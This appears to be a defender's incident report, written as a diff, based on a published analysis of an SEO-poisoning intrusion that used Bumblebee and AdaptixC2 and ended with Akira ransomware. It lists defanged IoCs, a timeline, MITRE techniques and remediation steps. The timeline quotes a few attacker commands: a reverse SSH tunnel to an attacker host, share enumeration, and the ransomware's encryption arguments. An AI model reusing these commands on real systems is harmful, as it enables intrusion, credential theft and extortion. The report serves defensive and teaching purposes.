@@ -1,1 +1,75 @@
+Incident Report based off DFIR "From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira" attack analysis
 
+1.Summary
+Incident ID:0001
+Incident Overview: In july 2025 intrusion was detected using SEO poisoning attack. Domain was created to lure users
+searching for "ManageEngine OPManager". After downloading MSI installer DLL side-loading was used to establish 
+command-and-control. Five hours later renamed AdgNsy.exe was deployed to establish persistent Command-and-control channel
+to allow living-off-the-land via windows discovery commands (systeminfo, nltest). Threat actor created new privileged accounts
+and installed RustDesk on multiple servers for remote access. For next two days threat actor used RDP(Remote Desktop Protocol) to
+gain access to domain controller and backup server. After that credentials were harvested and LSASS memory was dumped across multiple hosts.
+Data exfiltration was done through FileZilla, approximately 75 GB of data was exfiltrated including file shares, user credentials, SYSVOL domain
+configurations. 44 hours after initial access Akira ransomware was deployed to maximize impact across the infrastructure.
+Key findings: initial access done via SEO poisoning,file shares user credentials and SYSVOL domain configuration data exfiltrated, 
+BumbleBee loader, Akira malware(locker.exe), AdaptixC2 beacon,SSH proxy, FileZilla, SFTP  used. Data was encrypted after two days
+Stakeholder Impact: Exposure of customers' and clients' data, Possible legal liability, Possible loss of shareholder's value,
+Exposure of employees' data
+
+2.Technical analysis
+Affected systems: Almost every device accross internal network including domain controllers, servers, backup servers, file servers
+Indicators of Compromise (IoCs):opmanager[.]pro, download-center[.]online, ev2sirbd269o5j[.]org - BumbleBee, 
+2rxyt8yrhq0bgj[.]org - BumbleBee, d1hmxkpwby0d4s[.]org - BumbleBee, yj6jurm5qqkye5[.]org - BumbleBee, ewujsfb1dp5ran[.]org - BumbleBee,
+8doj8uvx604eck[.]org - BumbleBee, kwywztxoo2xdot[.]org - BumbleBee, ky1d1p1daahe5t[.]org - BumbleBee, ovh1kn1tcqw5kp[.]org - BumbleBee,
+6cimu4mc085em8[.]org - BumbleBee, 5ka8rxp6t6eup2[.]org - BumbleBee, ks501oz9nm3v05[.]org - BumbleBee, v5rjsdqogstopr[.]org - BumbleBee,
+192[.]121.22.94 - BumbleBee, 109[.]205.195.211 - BumbleBee, 188[.]40.187.145 - BumbleBee, 171[.]22.183.43 - BumbleBee, 194[.]127.178.21 - BumbleBee,
+172[.]96.137.160 - AdaptixC2, 193[.]242.184.150 - Reverse SSH Tunnel, 185[.]174.100.203 - Exfil Server, 
+ManageEngine-OpManager.msi hashes(MD5,SHA-1,SHA-256)(124a48b78060fa851e1cc077ca35713c, ab82bf27132323861810c0efcac6d5dd01600dd4, 186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da),
+msimg32.dll(MD5,SHA-1,SHA-256)(ca8646dfc88423bb9fffda811160cebe, febbaf5f08a8e0782ffcce8beef1f2b4e249a52b,  a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331),
+locker.exe(MD5,SHA-1,SHA-256)(8c113b3aa82c81eee7c6b4ed0ba9a90f, d66944e1a57daf04d3e809f22cd01946d593acaf, de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d)
+Technical timeline:
+Day 1:
+18:01 UTC initial access - User navigated to watering hole site opmanager.pro and downloaded ManageEngine-OpManager.msi which downloaded Bumblebee sideloader.
+18:11 UTC C2 - Bumblebee made connections to ev2sirbd269o5j[.]org and 188[.]40.187.145:443
+23:27 UTC C2 and Discovery - All actions done with AdaptixC2 from 172[.]96.137.160 - Renamed utility is dropped (AdgNsy.exe), commands ran:whoami, systeminfo, quser, nltest, ping
+23:54 UTC Persistence and privilege escalation - Created domain account and added one to the enterprise administration group
+Day 2:
+00:52 UTC Lateral movement - RDP to domain controller
+01:04 UTC Credential access - wbadmin used to create a backup of the ntds.dit
+01:57 UTC Persistence and C2 - RustDesk installed as an additional C2 channel
+Day 3:
+08:04 UTC C2 - Ssh proxy tunnel established (root@193[.]242.184.150 -R *:10400 -p 22)
+09:01 UTC Discovery - Used SoftPerfect Network Scanner and ran commands: quser, systeminfo, net.exe
+09:11 UTC Credential Access - Threat actor uses powershell script on the PostgreSQL instance to dump credentials from the software
+09:16 UTC Exfiltration - Data exfiltrated to 185[.]174.100.203:22 using FileZilla and SFTP
+10:59 UTC Discovery - SPN and SMB Enumeration (Invoke_shareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\programdata\shares.txt) and commands ran: systeminfo, net.exe
+12:39 UTC Credential Access - comsvcs.dll used to dump LSASS memory
+13:55 UTC Impact - Akira ransomware(locker.exe) deployment starts (locker.exe -p=G:\ -n=15(Encryption of disk G with only 15% of each file to be encrypted))
+17:45 UTC Impact - Completion of the encryption
+Day 5:
+10:02 UTC C2 - SSH tunnel set back up (ssh root@193[.]242.184.150 -R *:10400 -p 22)
+10:10 UTC Discovery - Invoke_shareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii c:\programdata\shares.txt
+12:24 UTC Lateral movement and Discovery - Threat actor connected to domain controller via RDP and starts discovery for the child domain
+12:52 UTC Impact - Threat actors deploys Akira to the child domain via main controller
+
+TTPs:T1189(Drive-by Compromise), T1204.002(User Execution:Malicious File), T1059.001(Command and Scripting Interpreter: Powershell),T1047(Windows Management Instrumentation), T1569.002(System Services: Service Execution),
+T1136.002(Create Account: Domain Account), T1543.003(Create or Modify System Process: Windows Service), T1574.001(Hijack Execution Flow: DLL), T1055(Process Injection), T1036(Masquerading), T1070.004(Indicator Removal: File Deletion), 
+T1027.010(Obfuscated Files or Information: Command Obfuscation), T1003.001(OS Credential Dumping: LSASS Memory),T1003.003(OS Credential Dumping: NTDS), T1555(Credentials from Password Stores) T1087(Account Discovery), 
+T1087.002(Account Discovery: Domain Account), T1069.002(Permission Groups Discovery: Domain Groups), T1482(Domain Trust Discovery), T1083(File and Directory Discovery), T1087.001(Account Discovery: Local Account), T1069.001(Permission Groups Discovery: Local Groups),
+T1046(Network Service Discovery), T1135(Network Share Discovery), T1018(Remote System Discovery), T1082(System Information Discovery), T1033(System Owner/User Discovery), T1016(System Network Configuration Discovery)  T1021.001(Remote Services: Remote Desktop Protocol),
+T1021.003(Remote Services: Distributed Component Object Model), T1039(Data from Network Shared Drive), T1572(Protocol Tunneling),T1090(Proxy), T1219(Remote Access Tools), T1568.002(Dynamic Resolution: Domain Generation Algorithms),
+T1071.001(Application Layer Protocol: Web Protocols), T1041(Exfiltration Over C2 Channel), T1048.001(Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol), T1486(Data Encrypted for Impact) T1490(Inhibit System Recovery)
+
+3.Impact
+After 44 hours Akira deployment began starting with encrypting the backup server. Remote execution was done from main
+domain controller to encrypt network shares after that threat actor pivoted to the child domain and executed akira's binary 39 times
+on the domain controller upon execution Akira deleted Volume Shadow Copies and leveraged WMI to trigger a PowerShell
+command on every infected host.
+
+4.Response and recovery
+Used a backup from before the installation of BumbleBee loader, changed all administrative passwords, changed credentials in veeam PostgreSQL,
+Invalidated sessions, invalidated tokens and API keys, reset krbtgt multiple times, every ioc was added to a firewall blocklist,
+Restricted modifications and creation rights on program folders, configured gpo to monitor unexpected file modifications.
+
+5.Post-incident actions
+Perform an audit of AD configuration, Implement: Tiered Administration, WDAC policies, Microsoft Vulnerable Driver Blocklist for BYOVD,
+Secure Web Gateway. Perform Security Awareness trainings focusing on SEO poisoning. Update Playbooks.
